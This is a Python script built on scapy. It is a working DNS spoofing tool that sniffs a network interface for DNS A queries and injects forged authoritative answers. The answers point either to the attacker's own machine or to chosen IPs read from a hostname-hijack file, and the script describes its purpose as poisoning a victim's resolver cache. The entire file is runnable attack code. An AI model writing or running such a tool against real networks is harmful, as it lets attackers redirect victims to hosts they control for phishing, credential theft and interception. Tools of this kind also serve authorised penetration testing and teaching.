from scapy.all import Ether, IP, UDP, DNS, DNSRR, sniff, sendp
import argparse
import os
import socket

parser = argparse.ArgumentParser(description = "[Info] Captures network traffic and attempts to inject forged responses to poison the cache of a victim's resolver.")
parser.add_argument('-i', metavar='interface', help='the network device to listen to')
parser.add_argument('-f', metavar='hostnames', help='a list of IP addresses and hostname pairs specifying the hostnames to be hijacked')
parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')

args = parser.parse_args()
poison_ips = {}
interface = args.i if args.i else "eth0"

if args.f:
    with open(args.f) as fd:
        for line in fd:
            line = line.strip().split()
            poison_ips[line[1]] = line[0]

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
poison_ip = s.getsockname()[0]
s.close()

def dns_poison(pkt):
    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype != 1: return
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum
    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src
    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src
    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport
    pkt[DNS].qr = 1
    pkt[DNS].aa = 1
    pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=30, type="A", rdata=poison_ip)
    pkt[DNS].ancount = 1
    sendp(pkt, iface=interface, verbose=0)

def dns_poisonf(pkt):
    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype != 1: return
    qname = pkt[DNS].qd.qname
    domain = qname[:-1].decode('utf-8')
    if domain not in poison_ips: return
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum
    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src
    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src
    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport
    pkt[DNS].qr = 1
    pkt[DNS].aa = 1
    pkt[DNS].an = DNSRR(rrname=qname, type="A", ttl=30, rdata=poison_ips[domain])
    pkt[DNS].ancount = 1
    sendp(pkt, iface=interface, verbose=0)

bpf_filter = str.lower(args.expression) if args.expression else None
sniff(iface = interface, filter=bpf_filter, prn=dns_poisonf if poison_ips else dns_poison, store=0)

